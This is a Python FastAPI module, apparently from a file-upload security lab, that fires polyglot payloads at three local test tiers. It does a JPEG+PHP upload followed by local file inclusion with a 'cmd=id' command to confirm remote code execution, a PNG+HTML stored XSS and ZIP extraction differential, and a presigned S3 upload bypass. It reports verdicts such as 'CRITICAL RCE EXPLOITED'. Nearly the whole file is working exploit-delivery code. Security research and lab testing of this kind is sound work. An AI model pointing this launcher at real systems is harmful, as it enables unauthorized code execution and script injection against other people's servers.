import sys
import time
import requests
from pathlib import Path
from typing import Optional
from fastapi import APIRouter, HTTPException, UploadFile, File, Form
from pydantic import BaseModel

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent.parent
STORAGE_DIR = Path(__file__).resolve().parent.parent / "storage"

router = APIRouter(prefix="/api/testbed", tags=["testbed"])

TIER_CONFIG = {
    1: {
        "name": "Tier 1 — Legacy LAMP (PHP 8.1 / Apache)",
        "base": "http://localhost:8081",
        "upload": "http://localhost:8081/upload.php",
        "lfi_template": "http://localhost:8081/?page=uploads/{filename}&cmd=id",
        "vector": "JPEG+PHP → LFI (RCE)",
    },
    2: {
        "name": "Tier 2 — Modern MERN (Express / Node.js)",
        "base": "http://localhost:3001",
        "frontend": "http://localhost:3000",
        "upload": "http://localhost:3001/upload",
        "static_template": "http://localhost:3001/uploads/{filename}",
        "extracted": "http://localhost:3001/extracted",
        "clear": "http://localhost:3001/clear",
        "vector": "PNG+HTML Stored XSS / PNG+ZIP Differential",
    },
    3: {
        "name": "Tier 3 — Cloud-Native (FastAPI / S3 Storage)",
        "base": "http://localhost:8000",
        "s3": "http://localhost:9000",
        "frontend": "http://localhost:8080",
        "presigned": "http://localhost:8000/get-upload-url",
        "validate": "http://localhost:8000/validate-upload",
        "extracted": "http://localhost:8000/extracted",
        "clear": "http://localhost:8000/clear",
        "vector": "Pre-signed URL Bypass / S3 Worker Differential",
    },
}


@router.get("/status")
def get_tiers_status():
    """Probe live status and reachability of all 3 lab tiers."""
    statuses = []
    for tier_id, cfg in TIER_CONFIG.items():
        online = False
        latency_ms = None
        detail = ""
        try:
            t0 = time.monotonic()
            if tier_id == 1:
                r = requests.get(cfg["base"], timeout=2)
                online = r.status_code in (200, 302, 403)
                detail = f"Apache response: HTTP {r.status_code}"
            elif tier_id == 2:
                r = requests.get(f"{cfg['base']}/health", timeout=2)
                online = r.status_code == 200
                detail = r.text[:80]
            elif tier_id == 3:
                r = requests.get(f"{cfg['base']}/health", timeout=2)
                online = r.status_code == 200
                detail = r.text[:80]
            latency_ms = round((time.monotonic() - t0) * 1000, 1)
        except Exception as e:
            online = False
            detail = f"Unreachable: {str(e)[:60]}"

        statuses.append({
            "tier": tier_id,
            "name": cfg["name"],
            "base_url": cfg["base"],
            "online": online,
            "latency_ms": latency_ms,
            "detail": detail,
            "vector": cfg["vector"],
        })
    return {"tiers": statuses}


@router.post("/fire")
async def fire_payload(
    tier: int = Form(...),
    filename: Optional[str] = Form(None),
    file: Optional[UploadFile] = File(None),
):
    """
    Launch a synthesized polyglot attack against the specified lab tier.
    Accepts either an uploaded file or an artifact filename from studio/storage/.
    """
    if tier not in TIER_CONFIG:
        raise HTTPException(status_code=400, detail="Invalid tier. Choose 1, 2, or 3.")

    # Resolve payload bytes
    payload_bytes = None
    target_name = "exploit.bin"

    if file and file.filename:
        payload_bytes = await file.read()
        target_name = file.filename
    elif filename:
        fpath = STORAGE_DIR / filename
        if not fpath.exists():
            # Check project root fallback
            fpath = PROJECT_ROOT / filename
        if not fpath.exists():
            raise HTTPException(status_code=404, detail=f"Payload not found: {filename}")
        payload_bytes = fpath.read_bytes()
        target_name = fpath.name
    else:
        raise HTTPException(status_code=400, detail="No payload file or filename provided.")

    cfg = TIER_CONFIG[tier]
    t0 = time.monotonic()

    # ── Tier 1: Legacy LAMP Execution ──────────────────────────────────────────
    if tier == 1:
        try:
            upload_filename = target_name
            ext = upload_filename.split(".")[-1].lower() if "." in upload_filename else ""
            if ext not in ("jpg", "jpeg", "png", "gif"):
                upload_filename = f"{upload_filename}.jpeg"

            r = requests.post(
                cfg["upload"],
                files={"file": (upload_filename, payload_bytes, "image/jpeg")},
                headers={"Accept": "application/json"},
                timeout=8,
            )
            upload_ok = r.status_code in (200, 302)
            fn = upload_filename
            try:
                res_data = r.json()
                if "path" in res_data:
                    fn = res_data["path"].split("/")[-1]
            except Exception:
                pass

            lfi_url = cfg["lfi_template"].format(filename=fn)
            lfi_r = requests.get(lfi_url, timeout=5)
            rce_confirmed = any(marker in lfi_r.text for marker in ("uid=", "POLYMORPH_CMD_EXEC", "www-data", "Linux", "Windows", "Darwin"))

            return {
                "tier": 1,
                "target_name": upload_filename,
                "upload_status": r.status_code,
                "upload_bypassed": upload_ok,
                "lfi_url": lfi_url,
                "rce_confirmed": rce_confirmed,
                "execution_output": lfi_r.text[:500] if rce_confirmed else lfi_r.text[:200],
                "verdict": "CRITICAL RCE EXPLOITED" if rce_confirmed else "UPLOAD ACCEPTED (LFI READY)",
                "duration_ms": round((time.monotonic() - t0) * 1000, 1),
            }
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Tier 1 firing failed: {str(e)}")

    # ── Tier 2: MERN Execution ────────────────────────────────────────────────
    elif tier == 2:
        try:
            r = requests.post(
                cfg["upload"],
                files={"file": (target_name, payload_bytes, "image/png")},
                timeout=8,
            )
            upload_ok = r.status_code == 200
            data = r.json() if r.ok else {}
            uploaded_fn = data.get("filename", target_name)
            xss_url = cfg["static_template"].format(filename=uploaded_fn)

            # Wait briefly for background adm-zip worker
            time.sleep(1.2)
            ext_r = requests.get(cfg["extracted"], timeout=5)
            extracted_files = ext_r.json().get("files", []) if ext_r.ok else []

            differential_confirmed = any("pwned" in str(f) or "polymorph" in str(f) for f in extracted_files)

            return {
                "tier": 2,
                "target_name": target_name,
                "upload_status": r.status_code,
                "upload_bypassed": upload_ok,
                "xss_url": xss_url,
                "extracted_files": extracted_files,
                "differential_confirmed": differential_confirmed,
                "verdict": "DIFFERENTIAL EXTRACTED" if differential_confirmed else "MIME STORED XSS ACTIVE",
                "duration_ms": round((time.monotonic() - t0) * 1000, 1),
            }
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Tier 2 firing failed: {str(e)}")

    # ── Tier 3: Cloud-Native S3 Execution ─────────────────────────────────────
    elif tier == 3:
        try:
            # Step 1: Request presigned S3 upload URL
            presign_res = requests.get(
                f"{cfg['presigned']}?filename={target_name}&content_type=image/png",
                timeout=8,
            )
            if not presign_res.ok:
                raise Exception(f"Failed to obtain presigned URL: {presign_res.text}")

            upload_url = presign_res.json().get("upload_url")
            if upload_url and "minio:9000" in upload_url:
                upload_url = upload_url.replace("minio:9000", "localhost:9000")
            # Step 2: PUT directly to S3
            put_res = requests.put(
                upload_url,
                data=payload_bytes,
                headers={"Content-Type": "image/png"},
                timeout=12,
            )
            bypass_ok = put_res.status_code in (200, 204)

            # Step 3: Trigger validation sink
            time.sleep(0.8)
            val_res = requests.post(
                f"{cfg['validate']}?filename={target_name}",
                timeout=8,
            )
            val_data = val_res.json() if val_res.ok else {}

            return {
                "tier": 3,
                "target_name": target_name,
                "presign_status": presign_res.status_code,
                "s3_put_status": put_res.status_code,
                "perimeter_bypassed": bypass_ok,
                "validation_verdict": val_data,
                "verdict": "DIFFERENTIAL BYPASS CONFIRMED" if val_data.get("zip_detected") else "S3 INGESTION BYPASS",
                "duration_ms": round((time.monotonic() - t0) * 1000, 1),
            }
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Tier 3 firing failed: {str(e)}")


@router.get("/extracted")
def get_extracted_artifacts():
    """Aggregate files extracted by background workers across Tier 2 and Tier 3."""
    results = {"tier2": [], "tier3": []}
    try:
        r2 = requests.get(TIER_CONFIG[2]["extracted"], timeout=2)
        if r2.ok:
            results["tier2"] = r2.json().get("files", [])
    except Exception:
        pass

    try:
        r3 = requests.get(TIER_CONFIG[3]["extracted"], timeout=2)
        if r3.ok:
            results["tier3"] = r3.json().get("files", [])
    except Exception:
        pass

    return results


@router.post("/clear")
def clear_all_lab_dirs():
    """Trigger cleanup on Tier 2 and Tier 3 storage and extraction directories."""
    summary = {}
    try:
        r2 = requests.post(TIER_CONFIG[2]["clear"], timeout=3)
        summary["tier2"] = r2.json() if r2.ok else {"error": r2.text}
    except Exception as e:
        summary["tier2"] = {"error": str(e)}

    try:
        r3 = requests.post(TIER_CONFIG[3]["clear"], timeout=3)
        summary["tier3"] = r3.json() if r3.ok else {"error": r3.text}
    except Exception as e:
        summary["tier3"] = {"error": str(e)}

    return {"status": "ok", "cleared": summary}
